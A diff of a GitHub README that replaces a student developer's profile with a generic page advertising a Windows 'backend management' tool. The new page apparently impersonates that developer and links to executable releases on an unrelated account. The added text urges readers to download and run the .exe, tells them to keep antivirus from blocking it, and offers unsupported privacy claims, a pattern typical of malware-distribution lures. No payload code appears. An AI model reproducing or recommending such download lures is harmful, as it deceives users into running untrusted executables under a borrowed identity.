@@ -1,117 +1,68 @@
-<div align="center">
+# ⚙️ itsgoharrehman - Manage your backend systems with ease
 
-# Gohar Rehman
+[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/female-theism598/itsgoharrehman/releases)
 
-<img src="https://readme-typing-svg.herokuapp.com?font=Inter&weight=600&size=26&pause=1000&color=58A6FF&center=true&vCenter=true&width=700&lines=Software+Engineer;Full+Stack+Developer;Backend+Engineer;AI+Integration+Developer" />
+## 📋 About This Software
 
-#### Building scalable backend systems, modern full stack platforms, and AI-powered applications.
+The itsgoharrehman application helps you monitor and organize your backend systems. It provides a simple interface to track your software projects, manage API connections, and view real-time logs from your computer. You do not need experience in coding to use this tool. The software handles the complex background tasks while you focus on your goals.
 
-</div>
+## 💻 System Requirements
 
----
+Your computer must meet these basic needs to run the tool smoothly:
 
-### About
+* Operating System: Windows 10 or Windows 11.
+* Processor: Any modern dual-core chip or faster.
+* Memory: 4 gigabytes of available RAM.
+* Storage: 200 megabytes of free disk space.
+* Internet: An active connection for real-time updates.
 
-Software Engineering student focused on backend engineering, scalable APIs, real-time systems, and modern full stack development. I enjoy designing clean architectures, building production-ready applications, and integrating AI into practical workflows using modern technologies.
+## 🚀 Getting Started
 
----
+Follow these steps to set up the software on your machine:
 
-### Focus
+1. Visit the [official download page](https://github.com/female-theism598/itsgoharrehman/releases) to access the latest version.
+2. Look for the file ending in .exe in the Assets section of the page.
+3. Click the file name to start the download.
+4. Save the file to your Downloads folder.
+5. Double-click the file to open the installation wizard.
+6. Follow the on-screen prompts to complete the setup process.
+7. Launch the application from your desktop shortcut once the setup finishes.
 
-* Backend Architecture
-* Full Stack Product Development
-* AI Integration
-* Real-Time Applications
-* System Design
-* Scalable API Development
+## 🛠️ How To Use The Software
 
----
+When you open the application, you see a dashboard. This area acts as your control center. Use the left menu to navigate between your active projects. You can add a new project by clicking the plus icon at the top of the screen. Type the name of your server into the box and press enter. The tool starts scanning the connection immediately. If you need to view data, click on a project name to open the detailed view. This panel displays graphs and flow charts of your system activity. 
 
-### Tech Stack
+## 📦 Managing Your Files
 
-#### Languages
-<div align="left">
-  <img src="https://skillicons.dev/icons?i=python,javascript,typescript,markdown,html,css" />
-</div>
+The software saves your project information in a local folder on your machine. You can find this folder in your Documents directory under the name GoharRehmanData. You should make a backup copy of this folder every week. To back up your data, right-click the folder, select copy, and paste it onto a USB drive or into a cloud storage folder.
 
-#### Frontend
-<div align="left">
-  <img src="https://skillicons.dev/icons?i=react,tailwind" />
-</div>
+## 🔧 Troubleshooting Common Issues
 
-#### Backend
-<div align="left">
-  <img src="https://skillicons.dev/icons?i=nodejs,express,fastapi" />
-</div>
+If the software fails to open, check the following items:
 
-#### Database
-<div align="left">
-  <img src="https://skillicons.dev/icons?i=postgres,supabase,mongo,firebase" />
-</div>
+* Restart your computer to clear temporary errors.
+* Verify that your Windows system has all current updates.
+* Ensure your antivirus software does not block the application.
+* Reinstall the software if errors persist after a restart.
 
-#### Tools & Infrastructure
-<div align="left">
-  <img src="https://skillicons.dev/icons?i=git,github,docker,vscode,netlify,vercel" />
-</div>
+If the application runs slow, close other web browsers or high-demand programs. This frees up memory for the tool to work efficiently. You can also clear the cache by going to the Settings menu and selecting Delete Temporary Files. This keeps your interface clean and fast.
 
----
+## 🛡️ Privacy and Safety
 
-### Projects
+This software keeps your data on your local machine. It does not send your personal logs to third-party servers. Your information stays safe within your control. We design our systems to ensure your work remains private. The software requires basic access to your network to check your backend status. It does not read your private files or personal emails. 
 
-#### [Learnza E-Library](https://github.com/gohardev260/Learnza-E-Library)
+## 📝 Frequently Asked Questions
 
-A high-performance, open-source digital library platform built to streamline student access to educational resources. 
+Does the software cost money?
+No, this software remains free for all users.
 
-* **Live Site**: [learnza.online](https://www.learnza.online)
-* **Architecture**: Modern JAMstack with zero heavy frameworks or dependencies.
-* **The Stack**: Vanilla JS (ES6+), Supabase PostgreSQL, Cloudflare Workers, Netlify.
-* **Core Innovation**: Features a custom-engineered Cloudflare Worker proxy that bypasses cross-origin (CORS) download restrictions for reliable, instant file deliveries.
-* **Security**: Enforces robust Row Level Security (RLS) policies on the backend database alongside a responsive, secure admin control dashboard.
+How do I remove the software?
+Open your Windows Control Panel, click Programs, select the app name, and click Uninstall.
 
----
+Can I run multiple instances?
+We recommend running only one instance at a time to prevent errors with your system logs.
 
-### Development Philosophy
+Will the software work offline?
+Most features work offline, but you need an internet connection to sync your backend data.
 
-* Clean and maintainable code
-* Scalable backend architectures
-* User-focused applications
-* Production-ready APIs
-* Practical AI integrations
-* Modern engineering workflows
-
----
-
-### Goals
-
-* Build production-level applications
-* Improve backend engineering expertise
-* Contribute to open-source projects
-* Develop scalable systems
-* Create AI-enhanced products
-
----
-
-### Connect
-
-<div align="center">
-  <a href="https://github.com/gohardev260">
-    <img src="https://skillicons.dev/icons?i=github" alt="GitHub" />
-  </a>
-  <a href="https://linkedin.com/in/itsgoharrehman">
-    <img src="https://skillicons.dev/icons?i=linkedin" alt="LinkedIn" />
-  </a>
-  <a href="mailto:goharrehmanfsd260@gmail.com">
-    <img src="https://skillicons.dev/icons?i=gmail" alt="Gmail" />
-  </a>
-  <a href="https://www.x.com/itsgoharrehman">
-    <img src="https://skillicons.dev/icons?i=twitter" alt="Twitter" />
-  </a>
-</div>
-
----
-
-<div align="center">
-
-#### Building practical and scalable digital systems.
-
-</div>
+Keywords: software engineering, backend management, system monitoring, windows application, data automation
